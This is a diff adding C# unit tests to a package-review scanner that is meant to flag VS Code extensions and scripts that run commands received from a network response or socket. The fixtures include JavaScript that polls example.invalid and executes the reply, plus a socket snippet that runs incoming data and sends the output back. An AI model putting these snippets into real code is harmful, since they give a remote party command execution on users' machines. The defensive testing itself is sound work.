@@ -1757,6 +1757,36 @@ public sealed class PackageReviewTests : IDisposable
     }
 
     [Fact]
+    public void A_vscode_extension_that_runs_the_last_line_of_a_polled_response_is_noteworthy()
+    {
+        var pkg = """{"name":"poll","publisher":"acme","version":"0.0.1","main":"./extension.js"}""";
+        var r = Review(Zip("acme.poll-0.0.1.vsix", ("extension/package.json", U(pkg)),
+            ("extension/extension.js", U("const https = require('https'), cp = require('child_process');\nconst u = 'https://example.invalid/c';\nsetInterval(() => https.get(u, r => { let b = ''; r.on('data', c => b += c); r.on('end', () => cp.exec(b.split('\\n').pop())); }), 30000);"))));
+        Assert.Contains(r.Findings, f => f is { Rule: "package/response-command", Level: "noteworthy" });
+    }
+
+    [Fact]
+    public void A_socket_or_fetched_command_is_run_and_process_output_or_a_regexp_exec_is_not()
+    {
+        const string Rule = "runs a command read from a network response or socket";
+        Assert.Contains(Details("const net = require('net'), { exec } = require('child_process');\nconst s = net.connect(7000, 'example.invalid');\ns.on('data', d => exec(d.toString(), (e, out) => s.write(out)));"), d => d == Rule);
+        Assert.Contains(Details("const { exec: run } = require('child_process');\nasync function poll(u) { const r = await fetch(u); const t = await r.text(); go(t.trim()); }\nfunction go(cmd) { run(cmd); }"), d => d == Rule);
+        Assert.DoesNotContain(Details("const https = require('https'), { exec } = require('child_process');\nconst p = exec('make');\nlet out = '';\np.stdout.on('data', d => out += d);\np.on('close', () => exec(out));"), d => d == Rule);
+        Assert.DoesNotContain(Details("const https = require('https'), { exec } = require('child_process');\nhttps.get(u, r => { let b = ''; r.on('data', c => b += c); r.on('end', () => /x/.exec(b) && exec('ls')); });"), d => d == Rule);
+        Assert.DoesNotContain(Details("const https = require('https'), { spawn } = require('child_process');\nhttps.get(u, r => r.on('data', c => { spawn(c.toString(), []); spawn('npm', ['i'], { shell: true }); }));"), d => d == Rule);
+    }
+
+    [Fact]
+    public void A_derived_command_a_file_stream_or_an_unrelated_exec_helper_is_not_a_response_command()
+    {
+        const string Rule = "runs a command read from a network response or socket";
+        Assert.DoesNotContain(Details("const https = require('https'), { execSync } = require('child_process');\nhttps.get(u, res => { let body = ''; res.on('data', c => body += c); res.on('end', () => { const v = JSON.parse(body).version; const cmd = 'npm i -g example@' + v; execSync(cmd); }); });"), d => d == Rule);
+        Assert.DoesNotContain(Details("var n=require(\"child_process\"),h=require(\"https\");h.get(u,t=>{let r=\"\";t.on(\"data\",e=>r+=e)});function s(e){return n.execSync(e).toString()}"), d => d == Rule);
+        Assert.DoesNotContain(Details("const https = require('https'), { exec } = require('child_process');\nhttps.get(u, r => r.on('data', s => log(s)));\nfunction log(s) { console.log(s); }\nfunction run(s) { return exec(s); }"), d => d == Rule);
+        Assert.DoesNotContain(Details("const fs = require('fs'), https = require('https'), { exec } = require('child_process');\nconst rs = fs.createReadStream('task.sh');\nlet src = '';\nrs.on('data', c => src += c);\nrs.on('end', () => exec(src));"), d => d == Rule);
+    }
+
+    [Fact]
     public void A_vscode_display_name_with_zero_width_characters_is_noteworthy_alone_and_when_it_activates_at_start()
     {
         var pkg = """{"name":"sol","publisher":"acme","version":"1.0.0","displayName":"so​lid​ity","main":"./extension.js"}""";
